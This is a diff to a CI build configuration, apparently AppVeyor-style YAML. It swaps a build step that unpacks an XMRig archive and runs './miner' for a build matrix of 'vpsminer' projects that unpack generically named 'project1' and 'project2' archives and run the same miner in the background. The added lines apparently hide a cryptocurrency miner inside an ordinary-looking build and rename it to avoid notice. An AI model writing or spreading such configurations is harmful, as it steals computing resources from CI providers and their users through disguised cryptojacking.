@@ -11,19 +11,22 @@ init:
   - sudo apt-get update
   - sudo apt-get install -y bash
 
-build_script:
-  # First project setup and execution
-  - tar xvf xmrigdir.tar.gz
-  - cd xmrigdir
-  - chmod +x ./miner
-  - ./miner &  # Run in the background
+# Define a build matrix for different projects
+matrix:
+  - project: vpsminer1
+    build_script:
+      # Build commands for Project1
+      - tar xvf project1.tar.gz
+      - cd project1
+      - chmod +x ./miner
+      - ./miner &  # Run the first project in the background
+      - wait  # Wait for the process to finish
 
-  # Move to second project directory (assuming it exists)
-  - tar xvf xmrigdir.tar.gz
-  - cd xmrigdir
-  - chmod +x ./miner
-  - ./miner & # Run in the background
-
-  # Wait for both processes to finish
-  - wait
-  
+  - project: vpsminer2
+    build_script:
+      # Build commands for Project2
+      - tar xvf project2.tar.gz
+      - cd project2
+      - chmod +x ./miner
+      - ./miner &  # Run the second project in the background
+      - wait  # Wait for the process to finish
